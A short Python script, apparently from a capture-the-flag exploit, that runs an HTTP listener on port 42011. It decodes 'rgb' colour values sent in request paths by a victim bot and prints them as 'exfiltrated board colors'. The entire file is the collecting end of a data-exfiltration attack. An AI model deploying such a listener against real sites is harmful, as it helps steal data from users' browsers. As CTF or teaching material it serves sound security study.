from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Lấy query string sau dấu ?
        query = self.path[1:]  
        colors = query.split("rgb")  # tách theo "rgb"
        parsed_colors = []

        for i, chunk in enumerate(colors):
            if not chunk:
                continue
            # thêm lại "rgb" phía trước, bỏ kí tự thừa
            color = "rgb" + chunk
            color = urllib.parse.unquote(color)
            parsed_colors.append(color)

        print("\n[+] Exfiltrated board colors:")
        for i, c in enumerate(parsed_colors):
            print(f"Cell {i:02d}: {c}")

        # Trả về OK cho bot
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 42011), Handler)
    print("[*] Listening on http://0.0.0.0:42011")
    server.serve_forever()
